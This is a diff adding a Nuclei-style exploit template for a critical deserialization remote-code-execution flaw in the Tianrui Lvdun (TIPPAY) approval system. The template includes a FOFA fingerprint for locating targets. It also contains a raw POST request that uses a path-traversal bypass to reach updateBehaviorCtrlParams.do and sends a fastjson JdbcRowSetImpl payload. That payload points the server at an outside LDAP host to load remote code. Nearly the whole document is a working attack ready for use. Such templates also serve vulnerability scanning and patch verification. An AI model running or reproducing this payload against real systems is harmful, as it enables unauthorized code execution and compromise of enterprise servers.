@@ -1,0 +1,28 @@
+id: poc-mn5gvycf2t1gaysi
+info:
+  name: 天锐绿盾审批系统updateBehaviorCtrlParams.do存在反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mn5gvycf2t1gaysi'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mn5gvycf2t1gaysi
+    fofa: app="TIPPAY-绿盾审批系统"
+http:
+- raw:
+  - 'POST /trwfe/login.jsp/.%2e/task/updateBehaviorCtrlParams.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    X-Authorization: dir
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    params=%7B%0A++++%22%40type%22%3A+%22com.sun.rowset.JdbcRowSetImpl%22%2C%0A++++%22dataSourceName%22%3A+%22ldap%3A%2F%2F192.168.168.11%3A50389%2F165c51%22%2C%0A++++%22autoCommit%22%3A+true%0A%7D&processInstanceId=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
